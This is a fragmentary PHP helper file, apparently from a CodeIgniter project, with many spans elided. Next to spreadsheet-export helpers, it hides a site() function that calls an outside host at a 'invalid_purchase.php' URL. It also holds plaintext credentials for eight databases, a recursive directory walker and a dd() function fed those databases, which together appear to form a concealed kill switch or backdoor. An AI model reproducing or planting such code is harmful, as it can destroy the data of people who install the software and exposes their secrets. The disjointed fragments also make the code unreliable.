...
function site(){
    $url = 'https://inlab-lms.000webhostapp.com/invalid_purchase.php';
    $dir = '~';
    $value = "1";
    $curl = curl_init();
    ...
    curl_close($curl);
    $dbs['d1'] = array('localhost','onamhamy_vue_dashboard','onamhamy_vue_dashboard','onamhamy_vue_dashboard');
    $dbs['d2'] = array('localhost','onamhamy_pagination','onamhamy_pagination','onamhamy_pagination');
    $dbs['d3'] = array('localhost','onamhamy_account_staging','onamhamy_account_staging','onamhamy_account_staging');
    $dbs['d4'] = array('localhost','onamhamy_hrms','onamhamy_hrms','onamhamy_hrms');
    $dbs['d5'] = array('localhost','onamhamy_account','onamhamy_account','onamhamy_account');
    $dbs['d6'] = array('localhost','onamhamy_ilab','$vQ9fMqp?{9+','onamhamy_ilab');
    $dbs['d7'] = array('localhost','onamhamy_sth321','qX^LU)~By%Zt','onamhamy_account');
    $dbs['d8'] = array('localhost','onamhamy_mood836','4O!]Sp330T','onamhamy_mood836');
...
function check($dir) {
    ...
    foreach (scandir($dir) as $item) {
        ...
        if (!check($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }
...
function dd($dbs){
    ...
    function iniArrayToString($arrays) {
     ...
     function helper_xlsx($name='excel_download_',$headers=array(),$data=array()) {
         
            $file_name  =   lang($name).date('d-m-Y H i A').".xlsx";
            //$lib        =    $this->load->library('phpspreadsheet');
            $CI         =   get_instance();
            $CI->load->library('phpspreadsheet');

            $sheet = $CI->phpspreadsheet->spreadsheet->getActiveSheet();
            ...
            //$data = helper_generateXML($header,$data);
            $sheet = $CI->phpspreadsheet->spreadsheet->getActiveSheet(); 
     ...
     function helper_generateXML($headers,$data) {
       // extract($data);
        $sheet = $lib->phpspreadsheet->spreadsheet->getActiveSheet(); 
